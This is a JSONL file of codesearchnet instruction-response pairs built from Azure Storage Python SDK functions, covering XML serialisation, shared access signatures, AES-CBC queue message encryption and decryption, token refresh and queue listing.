{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconvert XML response to a list of shares.", "response": "def _convert_xml_to_share_stats(response):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <ShareStats>\n       <ShareUsage>15</ShareUsage>\n    </ShareStats>\n    '''\n    if response is None or response.body is None:\n        return None\n\n    share_stats_element = ETree.fromstring(response.body)\n    return int(share_stats_element.findtext('ShareUsage'))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsigning a requests. Session with the token.", "response": "def signed_session(self, session=None):\n        \"\"\"\n        Sign requests session with the token. This method is called every time a request is going on the wire.\n        The user is responsible for updating the token with the preferred tool/SDK.\n        In general there are two options:\n            - override this method to update the token in a preferred way and set Authorization header on session\n            - not override this method, and have a timer that triggers periodically to update the token on this class\n\n        The second option is recommended as it tends to be more performance-friendly.\n\n        :param session: The session to configure for authentication\n        :type session: requests.Session\n        :rtype: requests.Session\n        \"\"\"\n        session = session or requests.Session()\n        session.headers['Authorization'] = \"Bearer {}\".format(self.token)\n\n        return session"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndeletes all blob containers in the given storage account.", "response": "def purge_blob_containers(account, account_key):\n    \"\"\"\n        Delete all blob containers in the given storage account.\n        USE AT OWN RISK. NOT SUPPORTED BY STORAGE TEAM.\n    \"\"\"\n    bs = BlockBlobService(account, account_key)\n\n    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:\n        # use a map to keep track of futures\n        future_to_container_map = {executor.submit(delete_container, bs, container): container for container in bs.list_containers()}\n\n        # as the futures are completed, print results\n        for future in concurrent.futures.as_completed(future_to_container_map):\n            container_name = future_to_container_map[future].name\n\n            try:\n                is_deleted = future.result()\n                if is_deleted:\n                    print(\"Deleted container {} on first try\".format(container_name))\n                else:\n                    print(\"Skipped container {} as it no longer exists\".format(container_name))\n            except AzureException as e:\n                # if the deletion failed because there's an active lease on the container, we will break it\n                # since it is most likely left-over from previous tests\n                if 'lease' in str(e):\n                    bs.break_container_lease(container_name)\n                    is_deleted = bs.delete_container(container_name)\n\n                    if is_deleted:\n                        print(\"Deleted container {} after having broken lease\".format(container_name))\n                    else:\n                        print(\"Skipped container {} as it stopped existing after having broken lease\".format(container_name))\n                else:\n                    raise e\n            except Exception as e:\n                print(\"Skipped container \" + container_name + \" due to error \" + str(e))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _generate_encryption_data_dict(kek, cek, iv):\n    '''\n    Generates and returns the encryption metadata as a dict.\n\n    :param object kek: The key encryption key. See calling functions for more information.\n    :param bytes cek: The content encryption key.\n    :param bytes iv: The initialization vector.\n    :return: A dict containing all the encryption metadata.\n    :rtype: dict\n    '''\n    # Encrypt the cek.\n    wrapped_cek = kek.wrap_key(cek)\n\n    # Build the encryption_data dict.\n    # Use OrderedDict to comply with Java's ordering requirement.\n    wrapped_content_key = OrderedDict()\n    wrapped_content_key['KeyId'] = kek.get_kid()\n    wrapped_content_key['EncryptedKey'] = _encode_base64(wrapped_cek)\n    wrapped_content_key['Algorithm'] = kek.get_key_wrap_algorithm()\n\n    encryption_agent = OrderedDict()\n    encryption_agent['Protocol'] = _ENCRYPTION_PROTOCOL_V1\n    encryption_agent['EncryptionAlgorithm'] = _EncryptionAlgorithm.AES_CBC_256\n\n    encryption_data_dict = OrderedDict()\n    encryption_data_dict['WrappedContentKey'] = wrapped_content_key\n    encryption_data_dict['EncryptionAgent'] = encryption_agent\n    encryption_data_dict['ContentEncryptionIV'] = _encode_base64(iv)\n    encryption_data_dict['KeyWrappingMetadata'] = {'EncryptionLibrary': 'Python ' + __version__}\n\n    return encryption_data_dict", "response": "Generates and returns the encryption metadata as a dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _dict_to_encryption_data(encryption_data_dict):\n    '''\n    Converts the specified dictionary to an EncryptionData object for\n    eventual use in decryption.\n    \n    :param dict encryption_data_dict:\n        The dictionary containing the encryption data.\n    :return: an _EncryptionData object built from the dictionary.\n    :rtype: _EncryptionData\n    '''\n    try:\n        if encryption_data_dict['EncryptionAgent']['Protocol'] != _ENCRYPTION_PROTOCOL_V1:\n            raise ValueError(_ERROR_UNSUPPORTED_ENCRYPTION_VERSION)\n    except KeyError:\n        raise ValueError(_ERROR_UNSUPPORTED_ENCRYPTION_VERSION)\n    wrapped_content_key = encryption_data_dict['WrappedContentKey']\n    wrapped_content_key = _WrappedContentKey(wrapped_content_key['Algorithm'],\n                                             _decode_base64_to_bytes(wrapped_content_key['EncryptedKey']),\n                                             wrapped_content_key['KeyId'])\n\n    encryption_agent = encryption_data_dict['EncryptionAgent']\n    encryption_agent = _EncryptionAgent(encryption_agent['EncryptionAlgorithm'],\n                                        encryption_agent['Protocol'])\n\n    if 'KeyWrappingMetadata' in encryption_data_dict:\n        key_wrapping_metadata = encryption_data_dict['KeyWrappingMetadata']\n    else:\n        key_wrapping_metadata = None\n\n    encryption_data = _EncryptionData(_decode_base64_to_bytes(encryption_data_dict['ContentEncryptionIV']),\n                                      encryption_agent,\n                                      wrapped_content_key,\n                                      key_wrapping_metadata)\n\n    return encryption_data", "response": "Converts the specified dictionary containing the encryption data into an _EncryptionData object for the current language."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating and returns an encryption cipher for AES CBC using the given cek and iv.", "response": "def _generate_AES_CBC_cipher(cek, iv):\n    '''\n    Generates and returns an encryption cipher for AES CBC using the given cek and iv.\n\n    :param bytes[] cek: The content encryption key for the cipher.\n    :param bytes[] iv: The initialization vector for the cipher.\n    :return: A cipher for encrypting in AES256 CBC.\n    :rtype: ~cryptography.hazmat.primitives.ciphers.Cipher\n    '''\n\n    backend = default_backend()\n    algorithm = AES(cek)\n    mode = CBC(iv)\n    return Cipher(algorithm, mode, backend)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _validate_and_unwrap_cek(encryption_data, key_encryption_key=None, key_resolver=None):\n    '''\n    Extracts and returns the content_encryption_key stored in the encryption_data object\n    and performs necessary validation on all parameters.\n    :param _EncryptionData encryption_data:\n        The encryption metadata of the retrieved value.\n    :param obj key_encryption_key:\n        The key_encryption_key used to unwrap the cek. Please refer to high-level service object\n        instance variables for more details.\n    :param func key_resolver:\n        A function used that, given a key_id, will return a key_encryption_key. Please refer \n        to high-level service object instance variables for more details.\n    :return: the content_encryption_key stored in the encryption_data object.\n    :rtype: bytes[]\n    '''\n\n    _validate_not_none('content_encryption_IV', encryption_data.content_encryption_IV)\n    _validate_not_none('encrypted_key', encryption_data.wrapped_content_key.encrypted_key)\n\n    _validate_encryption_protocol_version(encryption_data.encryption_agent.protocol)\n\n    content_encryption_key = None\n\n    # If the resolver exists, give priority to the key it finds.\n    if key_resolver is not None:\n        key_encryption_key = key_resolver(encryption_data.wrapped_content_key.key_id)\n\n    _validate_not_none('key_encryption_key', key_encryption_key)\n    _validate_key_encryption_key_unwrap(key_encryption_key)\n    _validate_kek_id(encryption_data.wrapped_content_key.key_id, key_encryption_key.get_kid())\n\n    # Will throw an exception if the specified algorithm is not supported.\n    content_encryption_key = key_encryption_key.unwrap_key(encryption_data.wrapped_content_key.encrypted_key,\n                                                           encryption_data.wrapped_content_key.algorithm)\n    _validate_not_none('content_encryption_key', content_encryption_key)\n\n    return content_encryption_key", "response": "Validate and return the content_encryption_key stored in the encryption_data object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate a shared access signature for the account.", "response": "def generate_account(self, services, resource_types, permission, expiry, start=None,\n                         ip=None, protocol=None):\n        '''\n        Generates a shared access signature for the account.\n        Use the returned signature with the sas_token parameter of the service \n        or to create a new account object.\n\n        :param Services services:\n            Specifies the services accessible with the account SAS. You can \n            combine values to provide access to more than one service. \n        :param ResourceTypes resource_types:\n            Specifies the resource types that are accessible with the account \n            SAS. You can combine values to provide access to more than one \n            resource type. \n        :param AccountPermissions permission:\n            The permissions associated with the shared access signature. The \n            user is restricted to operations allowed by the permissions. \n            Required unless an id is given referencing a stored access policy \n            which contains this field. This field must be omitted if it has been \n            specified in an associated stored access policy. You can combine \n            values to provide more than one permission.\n        :param expiry:\n            The time at which the shared access signature becomes invalid. \n            Required unless an id is given referencing a stored access policy \n            which contains this field. This field must be omitted if it has \n            been specified in an associated stored access policy. Azure will always \n            convert values to UTC. If a date is passed in without timezone info, it \n            is assumed to be UTC.\n        :type expiry: datetime or str\n        :param start:\n            The time at which the shared access signature becomes valid. If \n            omitted, start time for this call is assumed to be the time when the \n            storage service receives the request. Azure will always convert values \n            to UTC. If a date is passed in without timezone info, it is assumed to \n            be UTC.\n        :type start: datetime or str\n        :param str ip:\n            Specifies an IP address or a range of IP addresses from which to accept requests.\n            If the IP address from which the request originates does not match the IP address\n            or address range specified on the SAS token, the request is not authenticated.\n            For example, specifying sip=168.1.5.65 or sip=168.1.5.60-168.1.5.70 on the SAS\n            restricts the request to those IP addresses.\n        :param str protocol:\n            Specifies the protocol permitted for a request made. The default value\n            is https,http. See :class:`~azure.storage.common.models.Protocol` for possible values.\n        '''\n        sas = _SharedAccessHelper()\n        sas.add_base(permission, expiry, start, ip, protocol, self.x_ms_version)\n        sas.add_account(services, resource_types)\n        sas.add_account_signature(self.account_name, self.account_key)\n\n        return sas.get_token()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _encrypt_queue_message(message, key_encryption_key):\n    '''\n    Encrypts the given plain text message using AES256 in CBC mode with 128 bit padding.\n    Wraps the generated content-encryption-key using the user-provided key-encryption-key (kek). \n    Returns a json-formatted string containing the encrypted message and the encryption metadata.\n\n    :param object message:\n        The plain text messge to be encrypted.\n    :param object key_encryption_key:\n        The user-provided key-encryption-key. Must implement the following methods:\n        wrap_key(key)--wraps the specified key using an algorithm of the user's choice.\n        get_key_wrap_algorithm()--returns the algorithm used to wrap the specified symmetric key.\n        get_kid()--returns a string key id for this key-encryption-key.\n    :return: A json-formatted string containing the encrypted message and the encryption metadata.\n    :rtype: str\n    '''\n\n    _validate_not_none('message', message)\n    _validate_not_none('key_encryption_key', key_encryption_key)\n    _validate_key_encryption_key_wrap(key_encryption_key)\n\n    # AES256 uses 256 bit (32 byte) keys and always with 16 byte blocks\n    content_encryption_key = os.urandom(32)\n    initialization_vector = os.urandom(16)\n\n    # Queue encoding functions all return unicode strings, and encryption should \n    # operate on binary strings.\n    message = message.encode('utf-8')\n\n    cipher = _generate_AES_CBC_cipher(content_encryption_key, initialization_vector)\n\n    # PKCS7 with 16 byte blocks ensures compatibility with AES.\n    padder = PKCS7(128).padder()\n    padded_data = padder.update(message) + padder.finalize()\n\n    # Encrypt the data.\n    encryptor = cipher.encryptor()\n    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()\n\n    # Build the dictionary structure.\n    queue_message = {'EncryptedMessageContents': _encode_base64(encrypted_data),\n                     'EncryptionData': _generate_encryption_data_dict(key_encryption_key,\n                                                                      content_encryption_key,\n                                                                      initialization_vector)}\n\n    return dumps(queue_message)", "response": "Encrypts a given message using AES256 with 128 bit padding and returns a json - formatted string containing the encrypted message and the encryption metadata."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the decrypted message contents from an EncryptedQueueMessage. If no encryption metadata is present, will return the unaltered message. :param str message: The JSON formatted QueueEncryptedMessage contents with all associated metadata. :param bool require_encryption: If set, will enforce that the retrieved messages are encrypted and decrypt them. :param object key_encryption_key: The user-provided key-encryption-key. Must implement the following methods: unwrap_key(key, algorithm)--returns the unwrapped form of the specified symmetric key using the string-specified algorithm. get_kid()--returns a string key id for this key-encryption-key. :param function resolver(kid): The user-provided key resolver. Uses the kid string to return a key-encryption-key implementing the interface defined above. :return: The plain text message from the queue message. :rtype: str", "response": "def _decrypt_queue_message(message, require_encryption, key_encryption_key, resolver):\n    '''\n    Returns the decrypted message contents from an EncryptedQueueMessage.\n    If no encryption metadata is present, will return the unaltered message.\n    :param str message:\n        The JSON formatted QueueEncryptedMessage contents with all associated metadata.\n    :param bool require_encryption:\n        If set, will enforce that the retrieved messages are encrypted and decrypt them.\n    :param object key_encryption_key:\n        The user-provided key-encryption-key. Must implement the following methods:\n        unwrap_key(key, algorithm)--returns the unwrapped form of the specified symmetric key using the string-specified algorithm.\n        get_kid()--returns a string key id for this key-encryption-key.\n    :param function resolver(kid):\n        The user-provided key resolver. Uses the kid string to return a key-encryption-key implementing the interface defined above.\n    :return: The plain text message from the queue message.\n    :rtype: str\n    '''\n\n    try:\n        message = loads(message)\n\n        encryption_data = _dict_to_encryption_data(message['EncryptionData'])\n        decoded_data = _decode_base64_to_bytes(message['EncryptedMessageContents'])\n    except (KeyError, ValueError):\n        # Message was not json formatted and so was not encrypted\n        # or the user provided a json formatted message.\n        if require_encryption:\n            raise ValueError(_ERROR_MESSAGE_NOT_ENCRYPTED)\n\n        return message\n    try:\n        return _decrypt(decoded_data, encryption_data, key_encryption_key, resolver).decode('utf-8')\n    except Exception:\n        raise AzureException(_ERROR_DECRYPTION_FAILURE)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _decrypt(message, encryption_data, key_encryption_key=None, resolver=None):\n    '''\n    Decrypts the given ciphertext using AES256 in CBC mode with 128 bit padding.\n    Unwraps the content-encryption-key using the user-provided or resolved key-encryption-key (kek). Returns the original plaintex.\n\n    :param str message:\n        The ciphertext to be decrypted.\n    :param _EncryptionData encryption_data:\n        The metadata associated with this ciphertext.\n    :param object key_encryption_key:\n        The user-provided key-encryption-key. Must implement the following methods:\n        unwrap_key(key, algorithm)--returns the unwrapped form of the specified symmetric key using the string-specified algorithm.\n        get_kid()--returns a string key id for this key-encryption-key.\n    :param function resolver(kid):\n        The user-provided key resolver. Uses the kid string to return a key-encryption-key implementing the interface defined above.\n    :return: The decrypted plaintext.\n    :rtype: str\n    '''\n    _validate_not_none('message', message)\n    content_encryption_key = _validate_and_unwrap_cek(encryption_data, key_encryption_key, resolver)\n\n    if not (_EncryptionAlgorithm.AES_CBC_256 == encryption_data.encryption_agent.encryption_algorithm):\n        raise ValueError(_ERROR_UNSUPPORTED_ENCRYPTION_ALGORITHM)\n\n    cipher = _generate_AES_CBC_cipher(content_encryption_key, encryption_data.content_encryption_IV)\n\n    # decrypt data\n    decrypted_data = message\n    decryptor = cipher.decryptor()\n    decrypted_data = (decryptor.update(decrypted_data) + decryptor.finalize())\n\n    # unpad data\n    unpadder = PKCS7(128).unpadder()\n    decrypted_data = (unpadder.update(decrypted_data) + unpadder.finalize())\n\n    return decrypted_data", "response": "Decrypts the given message using AES256 in CBC mode with 128 bit padding."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_file_service(self):\n        '''\n        Creates a FileService object with the settings specified in the \n        CloudStorageAccount.\n\n        :return: A service object.\n        :rtype: :class:`~azure.storage.file.fileservice.FileService`\n        '''\n        try:\n            from azure.storage.file.fileservice import FileService\n            return FileService(self.account_name, self.account_key,\n                               sas_token=self.sas_token,\n                               endpoint_suffix=self.endpoint_suffix)\n        except ImportError:\n            raise Exception('The package azure-storage-file is required. '\n                            + 'Please install it using \"pip install azure-storage-file\"')", "response": "Creates a FileService object with the settings specified in the \n        CloudStorageAccount."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating a shared access signature for the account.", "response": "def generate_shared_access_signature(self, services, resource_types,\n                                         permission, expiry, start=None,\n                                         ip=None, protocol=None):\n        '''\n        Generates a shared access signature for the account.\n        Use the returned signature with the sas_token parameter of the service \n        or to create a new account object.\n\n        :param Services services:\n            Specifies the services accessible with the account SAS. You can \n            combine values to provide access to more than one service. \n        :param ResourceTypes resource_types:\n            Specifies the resource types that are accessible with the account \n            SAS. You can combine values to provide access to more than one \n            resource type. \n        :param AccountPermissions permission:\n            The permissions associated with the shared access signature. The \n            user is restricted to operations allowed by the permissions. \n            Required unless an id is given referencing a stored access policy \n            which contains this field. This field must be omitted if it has been \n            specified in an associated stored access policy. You can combine \n            values to provide more than one permission.\n        :param expiry:\n            The time at which the shared access signature becomes invalid. \n            Required unless an id is given referencing a stored access policy \n            which contains this field. This field must be omitted if it has \n            been specified in an associated stored access policy. Azure will always \n            convert values to UTC. If a date is passed in without timezone info, it \n            is assumed to be UTC.\n        :type expiry: datetime or str\n        :param start:\n            The time at which the shared access signature becomes valid. If \n            omitted, start time for this call is assumed to be the time when the \n            storage service receives the request. Azure will always convert values \n            to UTC. If a date is passed in without timezone info, it is assumed to \n            be UTC.\n        :type start: datetime or str\n        :param str ip:\n            Specifies an IP address or a range of IP addresses from which to accept requests.\n            If the IP address from which the request originates does not match the IP address\n            or address range specified on the SAS token, the request is not authenticated.\n            For example, specifying sip=168.1.5.65 or sip=168.1.5.60-168.1.5.70 on the SAS\n            restricts the request to those IP addresses.\n        :param str protocol:\n            Specifies the protocol permitted for a request made. Possible values are\n            both HTTPS and HTTP (https,http) or HTTPS only (https). The default value\n            is https,http. Note that HTTP only is not a permitted value.\n        '''\n        _validate_not_none('self.account_name', self.account_name)\n        _validate_not_none('self.account_key', self.account_key)\n\n        sas = SharedAccessSignature(self.account_name, self.account_key)\n        return sas.generate_account(services, resource_types, permission,\n                                    expiry, start=start, ip=ip, protocol=protocol)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_data_bytes_or_stream_only(param_name, param_value):\n    '''Validates the request body passed in is a stream/file-like or bytes\n    object.'''\n    if param_value is None:\n        return b''\n\n    if isinstance(param_value, bytes) or hasattr(param_value, 'read'):\n        return param_value\n\n    raise TypeError(_ERROR_VALUE_SHOULD_BE_BYTES_OR_STREAM.format(param_name))", "response": "Validates the request body passed in is a file - like or bytes\n    object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_request_body(request_body):\n    '''Converts an object into a request body.  If it's None\n    we'll return an empty string, if it's one of our objects it'll\n    convert it to XML and return it.  Otherwise we just use the object\n    directly'''\n    if request_body is None:\n        return b''\n\n    if isinstance(request_body, bytes) or isinstance(request_body, IOBase):\n        return request_body\n\n    if isinstance(request_body, _unicode_type):\n        return request_body.encode('utf-8')\n\n    request_body = str(request_body)\n    if isinstance(request_body, _unicode_type):\n        return request_body.encode('utf-8')\n\n    return request_body", "response": "Converts an object into a request body."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _convert_service_properties_to_xml(logging, hour_metrics, minute_metrics,\n                                       cors, target_version=None, delete_retention_policy=None, static_website=None):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <StorageServiceProperties>\n        <Logging>\n            <Version>version-number</Version>\n            <Delete>true|false</Delete>\n            <Read>true|false</Read>\n            <Write>true|false</Write>\n            <RetentionPolicy>\n                <Enabled>true|false</Enabled>\n                <Days>number-of-days</Days>\n            </RetentionPolicy>\n        </Logging>\n        <HourMetrics>\n            <Version>version-number</Version>\n            <Enabled>true|false</Enabled>\n            <IncludeAPIs>true|false</IncludeAPIs>\n            <RetentionPolicy>\n                <Enabled>true|false</Enabled>\n                <Days>number-of-days</Days>\n            </RetentionPolicy>\n        </HourMetrics>\n        <MinuteMetrics>\n            <Version>version-number</Version>\n            <Enabled>true|false</Enabled>\n            <IncludeAPIs>true|false</IncludeAPIs>\n            <RetentionPolicy>\n                <Enabled>true|false</Enabled>\n                <Days>number-of-days</Days>\n            </RetentionPolicy>\n        </MinuteMetrics>\n        <Cors>\n            <CorsRule>\n                <AllowedOrigins>comma-separated-list-of-allowed-origins</AllowedOrigins>\n                <AllowedMethods>comma-separated-list-of-HTTP-verb</AllowedMethods>\n                <MaxAgeInSeconds>max-caching-age-in-seconds</MaxAgeInSeconds>\n                <ExposedHeaders>comma-seperated-list-of-response-headers</ExposedHeaders>\n                <AllowedHeaders>comma-seperated-list-of-request-headers</AllowedHeaders>\n            </CorsRule>\n        </Cors>\n        <DeleteRetentionPolicy>\n            <Enabled>true|false</Enabled>\n            <Days>number-of-days</Days>\n        </DeleteRetentionPolicy>\n        <StaticWebsite>\n            <Enabled>true|false</Enabled>\n            <IndexDocument></IndexDocument>\n            <ErrorDocument404Path></ErrorDocument404Path>\n        </StaticWebsite>\n    </StorageServiceProperties>\n    '''\n    service_properties_element = ETree.Element('StorageServiceProperties')\n\n    # Logging\n    if logging:\n        logging_element = ETree.SubElement(service_properties_element, 'Logging')\n        ETree.SubElement(logging_element, 'Version').text = logging.version\n        ETree.SubElement(logging_element, 'Delete').text = str(logging.delete)\n        ETree.SubElement(logging_element, 'Read').text = str(logging.read)\n        ETree.SubElement(logging_element, 'Write').text = str(logging.write)\n\n        retention_element = ETree.SubElement(logging_element, 'RetentionPolicy')\n        _convert_retention_policy_to_xml(logging.retention_policy, retention_element)\n\n    # HourMetrics\n    if hour_metrics:\n        hour_metrics_element = ETree.SubElement(service_properties_element, 'HourMetrics')\n        _convert_metrics_to_xml(hour_metrics, hour_metrics_element)\n\n    # MinuteMetrics\n    if minute_metrics:\n        minute_metrics_element = ETree.SubElement(service_properties_element, 'MinuteMetrics')\n        _convert_metrics_to_xml(minute_metrics, minute_metrics_element)\n\n    # CORS\n    # Make sure to still serialize empty list\n    if cors is not None:\n        cors_element = ETree.SubElement(service_properties_element, 'Cors')\n        for rule in cors:\n            cors_rule = ETree.SubElement(cors_element, 'CorsRule')\n            ETree.SubElement(cors_rule, 'AllowedOrigins').text = \",\".join(rule.allowed_origins)\n            ETree.SubElement(cors_rule, 'AllowedMethods').text = \",\".join(rule.allowed_methods)\n            ETree.SubElement(cors_rule, 'MaxAgeInSeconds').text = str(rule.max_age_in_seconds)\n            ETree.SubElement(cors_rule, 'ExposedHeaders').text = \",\".join(rule.exposed_headers)\n            ETree.SubElement(cors_rule, 'AllowedHeaders').text = \",\".join(rule.allowed_headers)\n\n    # Target version\n    if target_version:\n        ETree.SubElement(service_properties_element, 'DefaultServiceVersion').text = target_version\n\n    # DeleteRetentionPolicy\n    if delete_retention_policy:\n        policy_element = ETree.SubElement(service_properties_element, 'DeleteRetentionPolicy')\n        ETree.SubElement(policy_element, 'Enabled').text = str(delete_retention_policy.enabled)\n\n        if delete_retention_policy.enabled:\n            ETree.SubElement(policy_element, 'Days').text = str(delete_retention_policy.days)\n\n    # StaticWebsite\n    if static_website:\n        static_website_element = ETree.SubElement(service_properties_element, 'StaticWebsite')\n        ETree.SubElement(static_website_element, 'Enabled').text = str(static_website.enabled)\n\n        if static_website.enabled:\n\n            if static_website.index_document is not None:\n                ETree.SubElement(static_website_element, 'IndexDocument').text = str(static_website.index_document)\n\n            if static_website.error_document_404_path is not None:\n                ETree.SubElement(static_website_element, 'ErrorDocument404Path').text = \\\n                    str(static_website.error_document_404_path)\n\n    # Add xml declaration and serialize\n    try:\n        stream = BytesIO()\n        ETree.ElementTree(service_properties_element).write(stream, xml_declaration=True, encoding='utf-8',\n                                                            method='xml')\n    except:\n        raise\n    finally:\n        output = stream.getvalue()\n        stream.close()\n\n    return output", "response": "Convert the service properties to XML."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert metrics to XML.", "response": "def _convert_metrics_to_xml(metrics, root):\n    '''\n    <Version>version-number</Version>\n    <Enabled>true|false</Enabled>\n    <IncludeAPIs>true|false</IncludeAPIs>\n    <RetentionPolicy>\n        <Enabled>true|false</Enabled>\n        <Days>number-of-days</Days>\n    </RetentionPolicy>\n    '''\n    # Version\n    ETree.SubElement(root, 'Version').text = metrics.version\n\n    # Enabled\n    ETree.SubElement(root, 'Enabled').text = str(metrics.enabled)\n\n    # IncludeAPIs\n    if metrics.enabled and metrics.include_apis is not None:\n        ETree.SubElement(root, 'IncludeAPIs').text = str(metrics.include_apis)\n\n    # RetentionPolicy\n    retention_element = ETree.SubElement(root, 'RetentionPolicy')\n    _convert_retention_policy_to_xml(metrics.retention_policy, retention_element)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting retention policy to XML.", "response": "def _convert_retention_policy_to_xml(retention_policy, root):\n    '''\n    <Enabled>true|false</Enabled>\n    <Days>number-of-days</Days>\n    '''\n    # Enabled\n    ETree.SubElement(root, 'Enabled').text = str(retention_policy.enabled)\n\n    # Days\n    if retention_policy.enabled and retention_policy.days:\n        ETree.SubElement(root, 'Days').text = str(retention_policy.days)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstop the refreshing token.", "response": "def stop_refreshing_token(self):\n        \"\"\"\n        The timer needs to be canceled if the application is terminating, if not the timer will keep going.\n        \"\"\"\n        with self.lock:\n            self.timer_stopped = True\n            self.timer.cancel()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_token_func():\n        print(\"{}: token updater was triggered\".format(datetime.datetime.now()))\n\n        # in this example, the OAuth token is obtained using the ADAL library\n        # however, the user can use any preferred method\n        context = adal.AuthenticationContext(\n            str.format(\"https://login.microsoftonline.com/{}\", settings.ACTIVE_DIRECTORY_TENANT_ID),\n            api_version=None, validate_authority=True)\n\n        oauth_token = context.acquire_token_with_client_credentials(\n            \"https://storage.azure.com\",\n            settings.ACTIVE_DIRECTORY_APPLICATION_ID,\n            settings.ACTIVE_DIRECTORY_APPLICATION_SECRET)\n\n        # return the token itself and the interval to wait before this function should be called again\n        # generally oauth_token['expiresIn'] - 180 is a good interval to give, as it tells the caller to\n        # refresh the token 3 minutes before it expires, so here we are assuming that the token expiration\n        # is at least longer than 3 minutes, the user should adjust it according to their AAD policy\n        return oauth_token['accessToken'], oauth_token['expiresIn'] - 180", "response": "This function makes a call to AAD to fetch an OAuth token and the interval to wait before refreshing it"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef generate_queue_shared_access_signature(self, queue_name,\n                                               permission=None,\n                                               expiry=None,\n                                               start=None,\n                                               id=None,\n                                               ip=None, protocol=None, ):\n        '''\n        Generates a shared access signature for the queue.\n        Use the returned signature with the sas_token parameter of QueueService.\n\n        :param str queue_name:\n            The name of the queue to create a SAS token for.\n        :param QueuePermissions permission:\n            The permissions associated with the shared access signature. The \n            user is restricted to operations allowed by the permissions. \n            Required unless an id is given referencing a stored access policy \n            which contains this field. This field must be omitted if it has been \n            specified in an associated stored access policy.\n        :param expiry:\n            The time at which the shared access signature becomes invalid. \n            Required unless an id is given referencing a stored access policy \n            which contains this field. This field must be omitted if it has \n            been specified in an associated stored access policy. Azure will always \n            convert values to UTC. If a date is passed in without timezone info, it \n            is assumed to be UTC.\n        :type expiry: datetime or str\n        :param start:\n            The time at which the shared access signature becomes valid. If \n            omitted, start time for this call is assumed to be the time when the \n            storage service receives the request. Azure will always convert values \n            to UTC. If a date is passed in without timezone info, it is assumed to \n            be UTC.\n        :type start: datetime or str\n        :param str id:\n            A unique value up to 64 characters in length that correlates to a \n            stored access policy. To create a stored access policy, use :func:`~set_queue_acl`.\n        :param str ip:\n            Specifies an IP address or a range of IP addresses from which to accept requests.\n            If the IP address from which the request originates does not match the IP address\n            or address range specified on the SAS token, the request is not authenticated.\n            For example, specifying sip='168.1.5.65' or sip='168.1.5.60-168.1.5.70' on the SAS\n            restricts the request to those IP addresses.\n        :param str protocol:\n            Specifies the protocol permitted for a request made. The default value\n            is https,http. See :class:`~azure.storage.common.models.Protocol` for possible values.\n        :return: A Shared Access Signature (sas) token.\n        :rtype: str\n        '''\n        _validate_not_none('queue_name', queue_name)\n        _validate_not_none('self.account_name', self.account_name)\n        _validate_not_none('self.account_key', self.account_key)\n\n        sas = QueueSharedAccessSignature(self.account_name, self.account_key)\n        return sas.generate_queue(\n            queue_name,\n            permission=permission,\n            expiry=expiry,\n            start=start,\n            id=id,\n            ip=ip,\n            protocol=protocol,\n        )", "response": "Generates a shared access signature for the given queue."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list_queues(self, prefix=None, num_results=None, include_metadata=False,\n                    marker=None, timeout=None):\n        '''\n        Returns a generator to list the queues. The generator will lazily follow \n        the continuation tokens returned by the service and stop when all queues \n        have been returned or num_results is reached.\n\n        If num_results is specified and the account has more than that number of \n        queues, the generator will have a populated next_marker field once it \n        finishes. This marker can be used to create a new generator if more \n        results are desired.\n\n        :param str prefix:\n            Filters the results to return only queues with names that begin\n            with the specified prefix.\n        :param int num_results:\n            The maximum number of queues to return.\n        :param bool include_metadata:\n            Specifies that container metadata be returned in the response.\n        :param str marker:\n            An opaque continuation token. This value can be retrieved from the \n            next_marker field of a previous generator object if num_results was \n            specified and that generator has finished enumerating results. If \n            specified, this generator will begin returning results from the point \n            where the previous generator stopped.\n        :param int timeout:\n            The server timeout, expressed in seconds. This function may make multiple \n            calls to the service in which case the timeout value specified will be \n            applied to each individual call.\n        '''\n        include = 'metadata' if include_metadata else None\n        operation_context = _OperationContext(location_lock=True)\n        kwargs = {'prefix': prefix, 'max_results': num_results, 'include': include,\n                  'marker': marker, 'timeout': timeout, '_context': operation_context}\n        resp = self._list_queues(**kwargs)\n\n        return ListGenerator(resp, self._list_queues, (), kwargs)", "response": "Returns a generator to list the queues in the specified prefix."}
